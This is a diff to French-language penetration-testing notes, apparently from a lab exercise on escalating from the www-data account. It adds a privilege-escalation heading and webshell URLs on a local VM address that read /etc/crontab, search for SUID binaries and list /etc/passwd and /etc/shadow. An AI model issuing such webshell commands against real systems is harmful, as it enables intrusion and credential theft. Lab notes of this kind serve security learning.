@@ -61,7 +61,11 @@ pwd: Entrée (le bouton)
     - -n : Ignore les DNS pour accélérer la connexion.
     - -p 12000 : Spécifie le port d'écoute.
 
+# faire passer www-data à un utilisateur privilégié
+
 # mettre ceci dans le navigateur:
+- http://192.168.1.26/files/simple_shell.php?cmd=cat%20/etc/crontab
+- http://192.168.1.26/files/simple_shell.php?cmd=find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null
 - http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
 - http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
 - http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz
